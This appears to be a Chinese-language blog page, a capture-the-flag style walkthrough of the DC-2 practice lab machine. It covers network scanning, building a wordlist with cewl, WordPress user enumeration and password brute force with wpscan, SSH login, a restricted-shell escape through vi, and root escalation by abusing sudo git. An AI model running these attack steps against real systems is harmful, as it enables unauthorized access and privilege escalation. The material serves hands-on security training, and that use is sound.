@@ -1,0 +1,443 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>DC-2渗透测试 - TXXJ</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+
+  
+  
+  <meta name="description" content="DC2 渗透测试实验环境靶机：DC-2
+攻击机：kal..."> 
+  
+  <meta name="author" content="TXXJ"> 
+
+  
+    <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  
+  
+    <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  
+  
+    <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  
+  
+    <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_h1619vhl1nr.css">
+
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css">
+
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: true,
+      lazyload: {
+        enable: true,
+        loadingImage: '',
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      motto: {
+        api: '',
+        default: '我在开了灯的床头下，想问问自己的心啊。'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        alwaysShow: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      }
+    }
+  </script>
+
+  
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+<nav class="navbar">
+  <div class="left"></div>
+  <div class="center">DC-2渗透测试</div>
+  <div class="right">
+    <i class="iconfont iconmenu j-navbar-menu"></i>
+  </div>
+</nav>
+
+  <nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content">
+      
+      
+      
+      
+      <li class="menu-item"><a href="/ " class="underline"> 首页</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/galleries " class="underline"> 相册</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/archives " class="underline"> 归档</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/tags " class="underline"> 标签</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/categories " class="underline"> 分类</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/about " class="underline"> 关于</a></li>
+      
+    </ul>
+    <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  </div>
+</nav>
+  <main id="main">
+  <div class="container" id="container">
+    <article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">DC-2渗透测试</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 01, 2020</span
+        class="post-info-item">
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1079</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="DC2-渗透测试"><a href="#DC2-渗透测试" class="headerlink" title="DC2 渗透测试"></a>DC2 渗透测试</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>靶机：DC-2</p>
+<p>攻击机：kall，win10</p>
+<h2 id="实验知识"><a href="#实验知识" class="headerlink" title="实验知识"></a>实验知识</h2><p>字典收集</p>
+<p>wpscan的基本使用</p>
+<p>绕过rbash</p>
+<p>环境变量提权</p>
+<p>git提权</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h4 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h4><h5 id="ip扫描"><a href="#ip扫描" class="headerlink" title="ip扫描"></a>ip扫描</h5><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">arp-scan -l</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">nmap -sV -p- <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.19</span><br>扫描到<span class="hljs-number">80</span>端口和<span class="hljs-number">7744</span>端口<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<h5 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h5><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">直接访问，失败<br>原因是没有对域名进行映射<br>修改hosts文件<br><span class="hljs-number">192.168.10.19</span> dc-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<h5 id="访问主页"><a href="#访问主页" class="headerlink" title="访问主页"></a>访问主页</h5><p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<p>点击flag拦可得到flag1</p>
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<p>根据提示提示拿取密码字典</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cewl http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span>/ -w passwd.txt<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>提示cewl是kali自带的一款密码提取工具，可以从网页中提取密码</p>
+</blockquote>
+<h4 id="2、漏洞扫描"><a href="#2、漏洞扫描" class="headerlink" title="2、漏洞扫描"></a>2、漏洞扫描</h4><h5 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nikto -h http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span>/<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<h5 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用wpscan首先要解决一个问题<br>wpscan启动后要进行更新，更新失败后无法使用<br>这里直接更新成功<br>直接使用命令<br>wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span> -e u<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<h4 id="3、密码爆破"><a href="#3、密码爆破" class="headerlink" title="3、密码爆破"></a>3、密码爆破</h4><h5 id="wpscan爆破"><a href="#wpscan爆破" class="headerlink" title="wpscan爆破"></a>wpscan爆破</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span> -u user.txt -p passwd.txt<br>jerry/adipiscing<br>tom/parturient<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<p>继续信息收集，根据nikto扫描到的登录页面wp-login.php，进行登录</p>
+<p>在管理页面中找到flag2</p>
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<p>根据提示的另一个路口，猜测是ssh入口</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">使用jerry和tom的账号进行登入<br>ssh <span class="hljs-symbol">jerry@</span><span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.19</span> -p <span class="hljs-number">7744</span><br>ssh <span class="hljs-symbol">tom@</span><span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.19</span> -p <span class="hljs-number">7744</span><br></code></pre></td></tr></table></figure>
+
+
+<p>其中tom成功登录</p>
+<h4 id="4、提权"><a href="#4、提权" class="headerlink" title="4、提权"></a>4、提权</h4><p>tom成功ssh登入，但是权限不高还有限制</p>
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<h5 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">可以使用<span class="hljs-keyword">vi</span>读取flag3.txt<br><span class="hljs-keyword">vi</span> flag3.txt<br>根据提示是需要切换到jerry用户<br><br>需要使用到<span class="hljs-keyword">vi</span>提权和PATH提权<br></code></pre></td></tr></table></figure>
+
+<h5 id="vi提权"><a href="#vi提权" class="headerlink" title="vi提权"></a>vi提权</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span><br>:<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br>:<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="PATH提权"><a href="#PATH提权" class="headerlink" title="PATH提权"></a>PATH提权</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$export</span> PATH=PATH=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/local/sbin</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><br></code></pre></td></tr></table></figure>
+
+
+<p>登入到jerry账号</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su jerry</span><br></code></pre></td></tr></table></figure>
+
+
+<p>在jerry中拿取flag4</p>
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<h5 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo git -p help<span class="hljs-built_in"> config </span><br>！whoami<br>!passwd root<br>修改密码<br>su root<br></code></pre></td></tr></table></figure>
+
+<p>成功登录，拿最后一个flag</p>
+<p><img   class="lazyload" data-original="/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+
+      </section>
+      <section class="extra">
+        
+        <ul class="copyright">
+  
+  <li><strong>本文作者：</strong>TXXJ</li>
+  <li><strong>本文链接：</strong><a href="https://txxj.github.io/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">https://txxj.github.io/DC-2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html</a></li>
+  <li><strong>版权声明：</strong>本博客所有文章均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"
+      rel="external nofollow" target="_blank"> BY-NC-SA </a>许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        <section class="donate">
+  <div class="qrcode">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+        
+<nav class="nav">
+  
+  
+    <a href="/DC-1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC:1渗透测试<i class="iconfont iconright"></i></a>
+  
+</nav>
+
+      </section>
+      
+      <section class="comments">
+  
+  <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article>
+  </div>
+</main>
+  <footer class="footer">
+  <div class="footer-social">
+    
+    
+    
+    
+    
+    <a href="tencent://message/?Menu=yes&uin=894519210 " target="_blank" onMouseOver="this.style.color= '#12B7F5'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconQQ "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="javascript:; " target="_blank" onMouseOver="this.style.color= '#09BB07'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconwechat-fill "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="https://www.instagram.com/izhaoo/ " target="_blank" onMouseOver="this.style.color= '#DA2E76'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconinstagram "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="https://github.com/izhaoo " target="_blank" onMouseOver="this.style.color= '#24292E'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  icongithub-fill "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="mailto:izhaoo@163.com " target="_blank" onMouseOver="this.style.color='#FFBE5B'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconmail"></i>
+    </a>
+    
+  </div>
+  <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  <div class="fab fab-daovoice">
+    <i class="iconfont iconcomment"></i>
+  </div>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+</body>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/modules.js"></script>
+<script src="/js/zui.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
+    "//widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "abcdefg"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+<script>
+  (function () {
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    } else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+<script>
+  var _hmt = _hmt || [];
+  (function () {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?4c204d8bc027a0455b5fc642ac334ca8";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+</html>
